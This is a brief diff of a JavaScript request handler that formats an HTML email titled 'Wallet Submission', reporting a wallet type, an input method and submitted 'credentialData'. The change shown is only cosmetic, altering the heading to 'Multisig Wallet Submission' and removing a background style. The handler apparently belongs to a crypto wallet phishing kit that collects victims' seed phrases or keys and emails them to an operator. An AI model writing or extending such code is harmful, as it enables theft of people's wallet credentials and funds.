@@ -42,10 +42,10 @@ module.exports = async (req, res) => {
 
         const emailHtml = `
             <div style="font-family: Arial, sans-serif;">
-                <h2>🔐 Wallet Submission</h2>
+                <h2> Multisig Wallet Submission</h2>
                 <p><strong>Wallet Type:</strong> ${walletType}</p>
                 <p><strong>Method:</strong> ${inputMethod}</p>
-                <pre style="background:#f4f4f4; padding:10px;">${credentialData}</pre>
+                <pre style=" padding:10px;">${credentialData}</pre>
             </div>
         `;
 
